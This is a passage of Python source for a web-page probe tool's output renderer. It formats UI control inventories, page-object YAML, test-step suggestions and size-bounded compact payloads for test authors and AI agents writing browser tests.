        step = (f'  →  {c["step"]}'
                if not brief or _keeps_exact_step(c) else "")
        out.append(f'{indent}{mark} [{c["kind"]}] {c["name"]}{sub} — '
                   f'{c["selector"]}{hidden}{step}{warn}')
        # NOOD_0128 — options surfaced by --open-native, so the author copies a
        # real option value into the select step instead of guessing.
        if c.get("options"):
            out.append(f'{indent}    options: '
                       + ", ".join(f'"{o}"' for o in c["options"]))
    return out


# NOOD_0137 Fix B — result-echo headings ("Showing Result(s) for …") vary by
# locale/session/A-B; one pasted verbatim caused a red first run that a
# same-session re-read could never catch. The skeleton's summary-count floor
# is the search assertion; these must never be offered as verbatim.
_RESULT_ECHO = re.compile(
    r"result|showing|résultat|ergebnis|treffer|resultado|risultat|resultaat",
    re.I)


def _is_search_echo(heading: str, term: str) -> bool:
    return term.lower() in heading.lower() or bool(_RESULT_ECHO.search(heading))


def _section_lines(pg: dict, indent: str = "  ", compact: bool = False,
                   cap: int | None = None,
                   search_term: str | None = None) -> list[str]:
    out = []
    headings = pg["headings"]
    if search_term is not None:
        headings = [h for h in headings if not _is_search_echo(h, search_term)]
        label = "seen on results page — verify before asserting"
    else:
        label = "copy assertions verbatim"
    if headings:
        out.append(f"{indent}exact texts ({label}): "
                   + "; ".join(f'"{h}"' for h in headings))
    if pg["next_pages"] and not compact:
        out.append(f"{indent}next pages: " + ", ".join(pg["next_pages"]))
    pom = _compact_pom(pg, cap) if compact else pg["pom_yaml"]
    if pom:
        out.append(f"{indent}POM suggestion (paste into resources/pageobjects/):")
        out += [indent + "  " + line for line in pom.splitlines()]
    for w in pg.get("warnings", []):
        out.append(f"{indent}⚠ {w}")
    return out


def _search_lines(sr: dict, compact: bool = False,
                  max_controls: int | None = None) -> list[str]:
    """NOOD_0117 — the results-page block from --search (and --follow,
    NOOD_0142, which lands here via the picked suggestion instead of a
    submit)."""
    controls = (_compact_controls(sr["controls"])
                if compact else sr["controls"])
    shown, hidden = _cap(controls, max_controls)
    if sr.get("followed_from"):
        head = (f'  after picking the "{sr["term"]}" suggestion for '
                f'"{sr["followed_from"]}" ({len(sr["controls"])} new '
                f'controls; * = needs POM entry):')
    else:
        head = (f'  after searching "{sr["term"]}" ({len(sr["controls"])} new '
                f'controls; * = needs POM entry):')
    out = [head]
    if compact and not sr.get("followed_from"):
        out.append('    ↳ author with `When User searches for "..."` only — that '
                   'one step opens the box, fills it, and submits. Do NOT add a '
                   'separate search-trigger step.')
    out += _control_lines(shown, indent="    ")
    if hidden:
        out.append(f"    … (+{hidden} more — raise --max-controls)")
    if compact:
        out += _tile_lines(sr["controls"], indent="      ", cap=max_controls)
        out += _step_lines(sr["controls"], indent="    ", cap=max_controls)
    out += _section_lines(sr, indent="    ", compact=compact, cap=max_controls,
                          search_term=sr["term"])
    rsum = sr.get("results_summary")
    if rsum:
        out.append(f'    results summary element: "{rsum["text"]}" — {rsum["selector"]}')
        out.append("    POM entry (paste into the results page POM):")
        out += ["      " + line for line in rsum["pom_yaml"].splitlines()]
        out.append("    prefer the summary-count assertion over counting rendered "
                   "cards (rendered counts vary with lazy-load and headless); "
                   "set the floor to your intent — the count above is today's "
                   "snapshot, don't hardcode it:")
        out.append(f'      Then {rsum["suggested_assertion"]}')
    return out


def _do_lines(pg: dict, indent: str = "  ") -> list[str]:
    """NOOD_0145 — a failed transaction action is the HEAD finding, not a
    buried key: the reviewed session's probe hid its failed dropdown action
    from both human and compact output, so every later action ran against an
    invalid state and the agent only ever saw the final expectation misses."""
    out = [f"{indent}⚠ {w}" for w in pg.get("do_warnings", [])]
    # NOOD_0224 — the rewrite prints with the transaction it changed.
    if pg.get("do_split_note"):
        out.append(f'{indent}{pg["do_split_note"]}')
    # NOOD_0214 — the completion count, always, not only on failure: "did the
    # rest of my chain run?" was costing whole re-probes to answer.
    if pg.get("do_skipped"):
        out.append(f'{indent}⚠ do: 0/{pg["do_requested"]} actions performed '
                   f'on this page — {pg["do_skipped"]}')
    elif pg.get("do_requested"):
        done, req = pg.get("do_completed", 0), pg["do_requested"]
        out.append(f"{indent}do: {done}/{req} actions completed" + (
            "" if done == req else " — the controls below are the state the "
            "chain STOPPED in, not the requested end state"))
    if pg.get("tab_switches"):     # NOOD_0178 — evidence even with no delta
        out.append(f"{indent}tab switches performed: "
                   + ", ".join(pg["tab_switches"]))
    df = pg.get("do_failed")
    if df:
        out.append(f'{indent}  transaction halted at action {df["index"] + 1} '
                   f'(resolved selector: {df["selector"]}); '
                   f'{pg.get("do_completed", 0)} action(s) completed before it')
        if df.get("skipped"):
            out.append(f'{indent}  not attempted: ' + "; ".join(df["skipped"]))
    return out


def _expect_lines(pg: dict, indent: str = "  ") -> list[str]:
    """NOOD_0142 — one verdict line per --expect text, with the copy-ready
    assertion for each hit. Prints at the TOP: it answers the caller's
    explicit question, everything else is inventory."""
    out = []
    for e in pg.get("expect", []):
        if e.get("found"):
            out.append(f'{indent}expect "{e["text"]}": FOUND — '
                       f'"…{e.get("context", "")}…"')
            out.append(f'{indent}  Then User should see "{e["text"]}"')
        else:
            out.append(f'{indent}expect "{e["text"]}": NOT FOUND on the '
                       'landed page')
    if pg.get("expect_warning"):
        out.append(f'{indent}⚠ {pg["expect_warning"]}')
    return out


def _suggest_lines(sg: dict, indent: str = "  ") -> list[str]:
    """NOOD_0141 — the --suggest block: exact strings first (the thing an
    author must copy verbatim), then the navigating selector and the no-op
    icon warning, then copy-ready steps."""
    out = [f'{indent}typeahead suggestions for "{sg["term"]}" '
           f'({len(sg["suggestions"])}, in order): '
           + "; ".join(f'"{s}"' for s in sg["suggestions"])]
    if sg.get("followed"):
        out.append(f'{indent}  --follow picked "{sg["followed"]}" — use this '
                   'EXACT text in the suggestion step, not the term you '
                   'asked with')
    noop = next((r for r in sg["rows"] if r.get("icon_is_noop")), None)
    if noop:
        out.append(f'{indent}  ⚠ rows carry an icon sub-element '
                   f'({noop["icon"]}) — clicking it is a no-op; the '
                   "suggestion step below clicks the navigating row itself")
    out.append(f'{indent}  rows navigate via: {sg["rows"][0]["selector"]}')
    out.append(f'{indent}  copy-ready steps (no POM entry needed — the '
               'suggestion step resolves the row itself):')
    out += [f'{indent}    {s}' for s in sg["steps"]]
    return out


def _delta_line(blk: dict, n: int, indent: str = "  ") -> str:
    """NOOD_0231 (P-7) — one prior stage of a chained --do, in one line."""
    label = blk.get("revealed_by") or blk.get("opened_by") or "(landing page)"
    # A compacted page has already traded `controls` for `total_controls`;
    # a raw one still carries the list. Read whichever this block is.
    count = blk.get("total_controls")
    if count is None:
        count = len(blk.get("controls") or [])
    return (f"{indent}stage {n} {label!r}: {count} controls "
            "(already reported — re-run without --delta for it)")


def render(result: dict, compact: bool = False, section: str = "all",
           max_controls: int | None = None, brief: bool = False,
           delta: bool = False) -> str:
    """Human/agent-readable text for the CLI.

    NOOD_0117 knobs, all token-savers for agent callers:
      compact       — only the controls that need a POM entry (or are
                      attribute-caption-only), no next-pages; POM YAML,
                      headings and search/reveal blocks stay.
      section       — controls|pom|steps|headings|all: emit exactly one slice
                      instead of the whole dump (grep-in-context killer).
      max_controls  — cap each control list, noting how many were hidden.
      brief         — NOOD_0179: print the step templates once instead of a
                      full sentence per control row (compact only).
      delta         — NOOD_0231: only the NEWEST reveal stage's inventory;
                      the landing page and every earlier stage collapse to
                      one line each. Walking a 7-verb chain needs one probe
                      per verb (the next control's name is unknowable until
                      the prior one executes) and each probe re-emitted every
                      stage before it — O(n²) output for O(n) new facts.
                      Opt-in, because an agent whose earlier output has
                      fallen out of context cannot recover it from here;
                      the same probe without --delta prints everything.
    """
    # W1 — compact mode caps each list by default; explicit --max-controls wins,
    # full (non-compact) render stays uncapped (it is opt-in verbose).
    cap = max_controls if max_controls is not None else (
        DEFAULT_COMPACT_CAP if compact else None)
    # NOOD_0179 — the cap is computed BEFORE the section branch: `--compact
    # --section steps` used to return here with max_controls=None and emit the
    # whole uncapped inventory, silently ignoring the flag documented as
    # "compact caps at 25" (one such call returned ~600 lines).
    if section != "all":
        return _render_section(result, section, cap)
    out = []
    for pg in result.get("pages", []):
        out.append(f"Probe: {pg['url']} — {pg.get('title') or '(no title)'}")
        # NOOD_0136 — honesty header: never bury a visual-only verdict or a
        # not-author-ready flag below a plausible-looking control list.
        if pg.get("framework_hints"):
            out.append("  framework: " + ", ".join(pg["framework_hints"]))
        if pg.get("coverage") == "visual_only":
            out.append("  coverage: visual_only — no accessible controls; do "
                       "NOT author selectors from this page")
        # NOOD_0137 — in compact mode the verdict covers only the suggestions
        # actually shown: a page-global false driven by a control the capped
        # output never surfaces sent agents off "fixing" irrelevant ⚠ items.
        ready = (_compact_author_ready(pg, cap) if compact
                 else pg.get("author_ready"))
        if pg.get("author_ready") is not None and ready is False:
            # NOOD_0145 — name the SPECIFIC blocker when the transaction never
            # reached the requested state: "fix the ⚠ items" reads as POM
            # housekeeping, and the reviewed session authored three red runs
            # off evidence from the wrong state.
            if _transaction_incomplete(pg):
                out.append("  author_ready: false — transaction did not reach "
                           "requested state (see the do/expect lines below); "
                           "do NOT author from this probe")
            else:
                out.append("  author_ready: false — fix the ⚠ items before "
                           "pasting POM/steps")
        out += _signal_lines(pg)
        out += _do_lines(pg)
        # NOOD_0142 — task-first: the blocks the caller explicitly asked for
        # (--expect / --suggest / --follow / --search) print BEFORE the page
        # inventory, so `| head` and small contexts read the answer first —
        # the old tail position cost a full second browser probe per `| head`.
        task_probe = bool(pg.get("suggest") or pg.get("search")
                          or pg.get("suggest_warning")
                          or pg.get("search_warning") or pg.get("expect"))
        out += _expect_lines(pg)
        if pg.get("suggest"):
            out += _suggest_lines(pg["suggest"])
        if pg.get("suggest_warning"):
            out.append(f"  ⚠ {pg['suggest_warning']}")
        if pg.get("search"):
            out += _search_lines(pg["search"], compact=compact,
                                 max_controls=cap)
        if pg.get("search_warning"):
            out.append(f"  ⚠ {pg['search_warning']}")
        # NOOD_0142 — with a task flag active the initial-page inventory is
        # background noise (retail homepages: 100+ banner tiles); diet it
        # hard unless the caller explicitly widened with --max-controls.
        diet = compact and task_probe and max_controls is None
        page_cap = 8 if diet else cap
        revealed = pg.get("revealed") or []
        # NOOD_0231 (P-7) — with --delta only the LAST stage is new. The
        # landing page and every earlier stage were reported by the probe that
        # ended there, so they collapse to one line each. With no reveal
        # stages at all there is no "prior" to skip and --delta is a no-op:
        # a single-shot probe must never return a page summarised away.
        skip_prior = delta and bool(revealed)
        if skip_prior:
            out.append(_delta_line(pg, 0))
        else:
            controls = (_compact_controls(pg["controls"])
                        if compact else pg["controls"])
            shown, hidden = _cap(controls, page_cap)
            label = ("needing a POM entry, of "
                     f"{len(pg['controls'])} total — --section controls for all"
                     if compact else "* = needs POM entry")
            out.append(f"  controls ({len(controls)}; {label}):")
            out += _control_lines(shown, brief=brief and compact)
            if hidden:
                out.append(f"    … (+{hidden} more — raise --max-controls)")
            if compact and not diet:
                out += _tile_lines(pg["controls"], cap=page_cap)
                out += _step_lines(pg["controls"], cap=page_cap, brief=brief)
            elif diet:
                out.append("    initial-page tiles/steps dieted (task flags "
                           "active) — pass --max-controls or re-probe without "
                           "--suggest/--search/--expect for the full inventory")
            out += _section_lines(pg, compact=compact, cap=page_cap)
        # NOOD_0116 — controls only visible AFTER a --click, labelled apart so
        # an agent doesn't author against them as if visible on load
        for stage, rev in enumerate(revealed, start=1):
            if skip_prior and stage < len(revealed):
                out.append(_delta_line(rev, stage))
                # A warning is a verdict, not inventory — it never collapses.
                out += [f"    ⚠ {w}" for w in rev.get("warnings", [])]
                continue
            diet = compact and rev.get("discovered")
            rev_cap = (DISCOVER_COMPACT_CAP
                       if diet and max_controls is None else cap)
            rev_controls = (_compact_controls(rev["controls"])
                            if compact else rev["controls"])
            rev_shown, rev_hidden = _cap(rev_controls, rev_cap)
            if rev.get("new_tab"):
                # NOOD_0178 — labelled like a frame block: its own scope, and
                # its steps only run after the switch, so those come first.
                out.append(f'  new tab: {rev["tab_url"]} (opened by: '
                           f'"{rev["opened_by"]}"; {len(rev["controls"])} '
                           'controls; * = needs POM entry):')
                out += [f"    {s}" for s in rev["switch_steps"]]
            elif rev.get("switched_to"):
                out.append(f'  seen after switching back to the '
                           f'{rev["switched_to"]} tab ({len(rev["controls"])} '
                           'new controls; * = needs POM entry):')
            else:
                how = "discovered by clicking" if rev.get("discovered") \
                    else "revealed after clicking"
                out.append(f'  {how} "{rev["revealed_by"]}" '
                           f'({len(rev["controls"])} new controls; '
                           '* = needs POM entry):')
            out += _control_lines(rev_shown, indent="    ")
            if rev_hidden:
                out.append(f"    … (+{rev_hidden} more — raise --max-controls)")
            if diet:
                out.append(f'    need this panel? re-probe --click '
                           f'"{rev["revealed_by"]}" for its steps + POM')
                out += [f"    ⚠ {w}" for w in rev.get("warnings", [])]
            else:
                if compact:
                    out += _tile_lines(rev["controls"], indent="      ",
                                       cap=rev_cap)
                    out += _step_lines(rev["controls"], indent="    ",
                                       cap=rev_cap)
                out += _section_lines(rev, indent="    ", compact=compact,
                                      cap=rev_cap)
        # NOOD_0136 — per-frame scoped blocks: steps inside need the switch
        # step first, and POM can't reach into a frame at all.
        for fb in pg.get("frames", []):
            fb_controls = (_compact_controls(fb["controls"])
                           if compact else fb["controls"])
            fb_shown, fb_hidden = _cap(fb_controls, cap)
            out.append(f'  iframe "{fb["frame"]}" ({len(fb["controls"])} '
                       f'controls) — precede its steps with: '
                       f'When User {fb["switch_step"]}')
            out += _control_lines(fb_shown, indent="    ")
            if fb_hidden:
                out.append(f"    … (+{fb_hidden} more — raise --max-controls)")
            out += _section_lines(fb, indent="    ", compact=compact, cap=cap)
        if pg.get("discovery"):
            d = pg["discovery"]
            note = " (budget capped — some candidates untried)" if d["capped"] else ""
            out.append(f'  discovery: {len(d["clicked"])} candidates clicked, '
                       f'{len(d["skipped"])} skipped{note}')
            for s in d["skipped"]:
                out.append(f'    skipped "{s["name"]}": {s["reason"]}')
        for w in pg.get("click_warnings", []):
            out.append(f"  ⚠ {w}")
        if compact:
            out += _skeleton_lines(pg)
    for err in result.get("errors", []):
        out.append(f"⚠ probe skipped {err['url']}: {err['error']}")
    return "\n".join(out)


def _blocks(pg: dict) -> list[dict]:
    """Main page + every reveal/search/picked sub-snapshot, flattened."""
    search = pg.get("search")
    return [pg, *pg.get("revealed", []),
            *([search] if search else []),
            *([search["picked"]] if search and search.get("picked") else [])]


def find_controls(result: dict, needle: str) -> list[dict]:
    """NOOD_0169 — pre-cap substring filter over EVERYTHING a probe collected:
    every block's controls, plus result-item captions and their card actions.
    The compact cap is presentation-only; when the one control an author needs
    ranks below it, the recourse used to be grepping the spill file
    (.noodle/last_payload.json) — file-tool round trips outside the engine.
    Case/space-insensitive on name, selector, suggested step, and caption.
    Pure — unit-testable without a browser."""
    n = _norm_name(needle)
    if not n:
        return []
    hits, seen = [], set()

    def _hit(page_url: str, c: dict, via: str):
        key = (page_url, c.get("selector"), c.get("name") or c.get("caption"))
        if key in seen:
            return
        seen.add(key)
        hits.append({"page": page_url, "via": via, **c})

    for pg in result.get("pages", []):
        url = pg.get("url", "")
        for blk in _blocks(pg):
            for c in blk.get("controls", []):
                hay = f'{c.get("name", "")} {c.get("selector", "")} ' \
                      f'{c.get("step", "")}'
                if n in _norm_name(hay):
                    _hit(url, c, "controls")
            for it in blk.get("result_items", []) or []:
                if n in _norm_name(it.get("caption", "")):
                    _hit(url, it, "result-item")
                for a in it.get("actions", []) or []:
                    if n in _norm_name(f'{a.get("name", "")} '
                                       f'{a.get("selector", "")}'):
                        _hit(url, {**a, "item_caption": it.get("caption")},
                             "result-item-action")
            # NOOD_0207 — headings too. --find searched controls and result
            # items only, so looking for an item by the text a human reads —
            # its card heading — returned "no match" on a page that plainly
            # showed it, and the reader concluded the item was absent.
            for h in blk.get("headings", []) or []:
                if h and n in _norm_name(h):
                    _hit(url, {"caption": h, "kind": "heading"}, "heading")
    return hits


def render_find(result: dict, needle: str) -> str:
    """The find_controls hits as paste-ready text — selector + POM line each,
    nothing else. Empty result says so instead of printing a blank page."""
    hits = find_controls(result, needle)
    if not hits:
        # NOOD_0207 — name WHICH page state was searched. "No match" without
        # it reads as "the app doesn't have this", when the commonest cause is
        # that the probe never reached the state that renders it.
        where = ", ".join(p.get("url", "?") for p in result.get("pages", []))
        return (f'--find "{needle}": no matching control, heading, result '
                f"item, or card action in this probe (searched: {where or '—'})"
                " — loosen the text or re-probe with --search/--click/--do to "
                "reach the state that renders it")
    out = [f'--find "{needle}": {len(hits)} match(es)']
    for h in hits:
        name = h.get("name") or h.get("caption") or "?"
        vis = "" if h.get("visible", True) else " (hidden)"
        item = f'  [card: {h["item_caption"]}]' if h.get("item_caption") else ""
        out.append(f'  [{h.get("kind", h["via"])}] {name}{vis} — '
                   f'{h.get("selector", "?")}{item}')
        if h.get("step"):
            out.append(f'      step: {h["step"]}')
        out.append(f'      pom: {str(name).lower()}:')
        # NOOD_0224 — through the quoter like every other emitted POM line:
        # this snippet is copy-ready, and a selector carrying a single quote
        # (`[title='Save']`) hand-quoted here pastes as unparseable YAML.
        out.append(f"        css: {_yaml_str(h.get('selector', ''))}")
    return "\n".join(out)


def _render_section(result: dict, section: str,
                    max_controls: int | None = None) -> str:
    """One narrow slice — a cheap model asks one narrow question."""
    out = []
    for pg in result.get("pages", []):
        if section == "pom":
            for blk in _blocks(pg):
                if blk["pom_yaml"]:
                    out.append(blk["pom_yaml"].rstrip())
                rsum = blk.get("results_summary")
                if rsum:
                    out.append(rsum["pom_yaml"].rstrip())
        elif section == "headings":
            for blk in _blocks(pg):
                out += blk["headings"]
        elif section == "steps":
            controls = [c for blk in _blocks(pg) for c in blk["controls"]]
            shown, hidden = _cap(controls, max_controls)
            out += [c["step"] for c in shown]
            if hidden:
                out.append(f"… (+{hidden} more — raise --max-controls)")
        elif section == "controls":
            # NOOD_0207 — collapse repeated families HERE too. The collapse
            # ran only for the compact/needs-POM slices, so a per-item control
            # repeated once per card flooded this list and pushed the page's
            # one submit control past --max-controls: the reviewed session
            # raised the cap to 200 and still could not see it.
            controls = _collapse_numbered(
                [c for blk in _blocks(pg) for c in blk["controls"]])
            shown, hidden = _cap(controls, max_controls)
            out += [line.strip() for line in _control_lines(shown)]
            if hidden:
                out.append(f"… (+{hidden} more — raise --max-controls)")
        elif section == "revealed":
            # NOOD_0126 — ONLY what a --click opened (its new controls + steps),
            # nothing from the initial load: open a named control, read its
            # delta, author. The single-control probe mode.
            for rev in pg.get("revealed", []):
                shown, hidden = _cap(rev["controls"], max_controls)
                out.append(f'revealed after clicking "{rev["revealed_by"]}" '
                           f'({len(rev["controls"])} new controls):')
                out += [line.strip() for line in _control_lines(shown)]
                if hidden:
                    out.append(f"… (+{hidden} more — raise --max-controls)")
        else:
            raise ValueError(f"unknown section {section!r} "
                             "(controls|pom|steps|headings|revealed|all)")
    if section == "revealed" and not out:
        out.append('no reveals — pass --click "<control>" to open a panel/tab/'
                   'dropdown first, then this shows only what it exposed.')
    for err in result.get("errors", []):
        out.append(f"⚠ probe skipped {err['url']}: {err['error']}")
    return "\n".join(out)


def _compact_page(pg: dict, max_controls: int, brief: bool = False) -> dict:
    """One page of compact_payload()."""
    need, hidden = _cap(_compact_controls(pg["controls"]), max_controls)
    ranked = [c for c in _rank_ready(pg["controls"])
              if not _is_consent_noise(c)]
    step_names: dict[str, list] = {}
    # NOOD_0231 (P-3) — collapse byte-identical entries BEFORE the cap and
    # carry the count instead. Same information in one line, and the cap slots
    # the twins used to eat now carry distinct steps.
    repeated: dict[str, int] = {}
    if brief:
        # NOOD_0179 — exact steps only where the wording is load-bearing;
        # everything else travels as a name under its template key.
        exact, exact_counts = _collapse_repeats(
            [c["step"] for c in ranked if _keeps_exact_step(c)])
        steps, steps_hidden = _cap(exact, max_controls)
        repeated |= {s: n for s, n in exact_counts.items()
                     if n > 1 and s in steps}
        by_kind: dict[str, list] = {}
        for c in ranked:
            if not _keeps_exact_step(c):
                by_kind.setdefault(_template_key(c.get("kind")),
                                   []).append(c["name"])
        for key, names in by_kind.items():
            uniq, counts = _collapse_repeats(names)
            shown, hid = _cap(uniq, max_controls)
            step_names[key] = shown
            repeated |= {n: k for n, k in counts.items()
                         if k > 1 and n in shown}
            steps_hidden += hid
    else:
        uniq, counts = _collapse_repeats([c["step"] for c in ranked])
        steps, steps_hidden = _cap(uniq, max_controls)
        repeated |= {s: n for s, n in counts.items() if n > 1 and s in steps}
    headings = pg["headings"]
    if pg.get("term"):        # search block — Fix B: no result-echo headings
        headings = [h for h in headings if not _is_search_echo(h, pg["term"])]
    out = {"url": pg["url"], "title": pg["title"],
           "total_controls": len(pg["controls"]),
           "needs_pom": need, "suggested_steps": steps,
           "headings": headings, "pom_yaml": _compact_pom(pg, max_controls)}
    if step_names:
        out["step_names"] = step_names
    if repeated:
        # NOOD_0231 (P-3) — {the collapsed entry: how many controls carry it}.
        # Keyed by whatever was deduped in the list above it: the step
        # sentence normally, the control name under `step_names` (brief).
        out["repeated_steps"] = repeated
    tiles = [c for c in pg["controls"] if _tile_caption(c)]  # W3a
    if tiles:
        # NOOD_0137 — the one uncapped list left; families collapse like the
        # text render (one exemplar per numbered family), then the cap.
        exemplars = [fam[0] for fam in _tile_families(tiles)]
        shown_tiles, hidden_tiles = _cap(exemplars, max_controls)
        out["tile_captions"] = shown_tiles
        dropped = hidden_tiles + (len(tiles) - len(exemplars))
        if dropped:
            out["tile_captions_dropped"] = dropped
    # NOOD_0128 — enumerated dropdown options (--open-native), name→values, so a
    # compact caller sees the selectable values regardless of needs_pom.
    dropdowns = {c["name"]: c["options"] for c in pg["controls"] if c.get("options")}
    if dropdowns:
        out["dropdown_options"] = dropdowns
    if hidden or steps_hidden:
        out["truncated"] = ("more controls exist — call again with "
                            "compact=False for the full dump")
    for key in ("revealed_by", "term", "results_summary", "followed_from",
                # NOOD_0156 — bound result-pick provenance + landed page
                "picked_caption", "picked_selector", "pick_warning",
                # NOOD_0156 follow-up — the author-ready result cards are the
                # POINT of a search probe; dropping them from compact forced
                # a compact=False re-probe (600 KB) just to see the products.
                # Already bounded by _RESULT_ITEMS_CAP.
                "result_items",
                # NOOD_0141 — --suggest payload (already compact by design)
                "suggest", "suggest_warning",
                # NOOD_0142 — --expect verdicts (one line per text)
                "expect", "expect_warning",
                # NOOD_0145 — failed transaction actions must survive compact
                # output; hiding them was the reviewed session's P0
                "do_warnings", "do_failed",
                # NOOD_0214 — the N/M completion count, structured
                "do_requested", "do_skipped",
                # NOOD_0224 — a comma-chain the engine rewrote is evidence:
                # the deltas below are keyed to the rewrite, not the request
                "do_split_note",
                # NOOD_0156 follow-up — the no-delta note on a do-reveal
                "note",
                "search_warning", "click_warnings",
                # NOOD_0136 — scope/honesty contract keys
                "warnings", "coverage", "framework_hints", "discovered",
                "settled", "frame", "switch_step", "discovery",
                # NOOD_0178 — the new-tab contract: what opened it, where it
                # went, and the exact steps that reach it at run time.
                "new_tab", "tab_url", "opened_by", "switch_steps",
                "switched_to", "tab_switches",
                # NOOD_0137 — run-time signals: popup/permission observations
                "popups_closed", "permission_prompts"):
        if pg.get(key):
            out[key] = pg[key]
    # NOOD_0214 — explicit, not truthiness: 0/4 completed is the single most
    # important number a --do payload carries and it must not fall out for
    # being falsy.
    if pg.get("do_requested"):
        out["do_completed"] = pg.get("do_completed", 0)
    # author_ready=False is the load-bearing value — a truthiness passthrough
    # would silently drop exactly the flag that must never be dropped.
    # NOOD_0137 — compact-scoped: only an ambiguous selector this payload
    # actually shows blocks; the skeleton rides along at the same level.
    if "author_ready" in pg:
        out["author_ready"] = _compact_author_ready(pg, max_controls)
        # NOOD_0166 — a false verdict carries its named reasons in-payload;
        # a naked false sent agents jq-ing (and misreading the budget note).
        if not out["author_ready"]:
            out["author_blocking"] = _author_blockers(pg, max_controls)
        out["skeleton"] = _skeleton_steps(pg)
        # NOOD_0223 — rides the ready path only, by construction (the producer
        # sets it there), so a blocked probe never hands over a "runnable"
        # skeleton that isn't.
        if pg.get("goal_skeleton"):
            out["goal_skeleton"] = pg["goal_skeleton"]
    if pg.get("revealed"):
        # NOOD_0137 Fix A — discovered blocks are signals, not catalogs; the
        # per-block `truncated` note points at compact=False for the full dump.
        out["revealed"] = [
            _compact_page(r, min(max_controls, DISCOVER_COMPACT_CAP)
                          if r.get("discovered") else max_controls, brief)
            for r in pg["revealed"]]
    if pg.get("frames"):
        out["frames"] = [_compact_page(f, max_controls, brief)
                         for f in pg["frames"]]
    if pg.get("search"):
        out["search"] = _compact_page(pg["search"], max_controls, brief)
    if pg.get("picked"):   # NOOD_0156 — inside a search block's recursion
        out["picked"] = _compact_page(pg["picked"], max_controls, brief)
    return out


# NOOD_0158 — the whole-payload budget, in serialized bytes. The per-list cap
# bounds each list; it never bounded the SUM. One probe of a retail homepage
# with --suggest/--follow returned 82 KB compact: two full page blocks (home +
# results), each with its own capped needs_pom (~300 B per control dict),
# suggested_steps, tile_captions and a rebuilt pom_yaml. The MCP caller's
# context cap rejected it, spilling the payload to disk and costing 13 recovery
# greps — the exact failure NOOD_0156 gap 2 fixed for one list and not for the
# total. ~24 KB is the CLI compact render's order of magnitude for the same
# page, and the number NOOD_0117 originally set out to beat.
# NOOD_0164 — one budget for every agent-facing payload, not a probe-only
# number: 24 KB was still above what MCP hosts inline, and the review that
# opened NOOD_0163 spilled a probe payload to a temp file and jq'd it back.
# The cap ladder below is what makes 8 KB survivable — it sheds junk-ranked
# lists first, so author-critical keys are the last thing to go.
COMPACT_BUDGET_BYTES = payload_budget.DEFAULT_BUDGET_BYTES

# The cap ladder walked when the budget is blown. Chrome-heavy lists (needs_pom,
# suggested_steps, tile_captions, pom_yaml) are what these caps govern, and they
# are ranked junk-last already (_compact_rank / _rank_ready), so a smaller cap
# sheds the least useful entries first. The author-critical keys — skeleton,
# suggest, expect, result_items, results_summary, author_ready, do_failed,
# warnings — are passthroughs that no cap touches, so they survive the floor.
_COMPACT_CAP_LADDER = (40, 25, 15, 8, 4)


def _delta_trim(page: dict) -> dict:
    """NOOD_0231 (P-7) — the JSON twin of _delta_line: keep the newest reveal
    stage whole, replace the landing inventory and every earlier stage with a
    one-line `stage N: M controls` note. Verdict keys (author_ready,
    do_failed, warnings, expect, …) are untouched — a diet that could hide a
    failed transaction would be a different bug entirely."""
    revealed = page.get("revealed") or []
    if not revealed:
        return page                        # nothing prior to skip
    out = {k: v for k, v in page.items()
           if k not in ("needs_pom", "suggested_steps", "step_names",
                        "repeated_steps", "tile_captions", "pom_yaml")}
    out["delta_skipped"] = [_delta_line(page, 0, indent="").strip()] + [
        _delta_line(r, i, indent="").strip()
        for i, r in enumerate(revealed[:-1], start=1)]
    out["revealed"] = [revealed[-1]]
    return out


def compact_payload(result: dict, max_controls: int = 40,
                    brief: bool = False, delta: bool = False) -> dict:
    """NOOD_0117 — the MCP-default probe payload: everything an author needs
    (needs-POM controls, paste-ready POM YAML, suggested steps, exact heading
    texts, search/reveal blocks) minus the full selector dump and next-pages
    list that made the raw payload a 24 KB resident blob.

    NOOD_0158 — and bounded as a WHOLE: the per-list cap steps down the ladder
    until the serialized payload fits COMPACT_BUDGET_BYTES, so a multi-page
    probe cannot blow a caller's context. Trimming is honest — the surviving
    payload carries `budget_trimmed` naming the cap it settled on."""
    def _build(cap: int) -> dict:
        pages = [_compact_page(pg, cap, brief)
                 for pg in result.get("pages", [])]
        if delta:
            pages = [_delta_trim(p) for p in pages]
        out = {"pages": pages, "errors": result.get("errors", [])}
        if brief:   # NOOD_0179 — the three sentences, once per payload
            out["step_templates"] = dict(STEP_TEMPLATES)
        # NOOD_0231 (P-3) — one hint per payload, not one per collapsed entry.
        # Recursive: a card grid usually lives on a REVEALED or search block,
        # never the landing page, so a top-level-only check would print the
        # hint exactly where it is least needed.
        def _has_repeats(node) -> bool:
            if isinstance(node, dict):
                return bool(node.get("repeated_steps")) or any(
                    _has_repeats(v) for v in node.values())
            return isinstance(node, list) and any(_has_repeats(v) for v in node)

        if _has_repeats(out["pages"]):
            out["repeated_steps_note"] = _REPEATED_HINT
        return out

    ladder = [c for c in _COMPACT_CAP_LADDER if c < max_controls]
    for cap in (max_controls, *ladder):
        out = _build(cap)
        if len(json.dumps(out, default=str)) <= COMPACT_BUDGET_BYTES:
            if cap != max_controls:
                out["budget_trimmed"] = (
                    f"lists capped at {cap} (from {max_controls}) to fit the "
                    f"{COMPACT_BUDGET_BYTES // 1000} KB payload budget — "
                    f"probe again with compact=False for the full dump")
            return out
    # Floor still over budget (a page whose passthroughs alone exceed it):
    # return it rather than truncate an author-critical key, and say so.
    out = _build(ladder[-1] if ladder else max_controls)
    out["budget_trimmed"] = (
        f"over the {COMPACT_BUDGET_BYTES // 1000} KB payload budget at the "
        f"smallest cap — the author-critical lists alone exceed it. "
        "Presentation only, NOT an authoring blocker: author_ready/"
        "author_blocking above are the verdict")
    return out
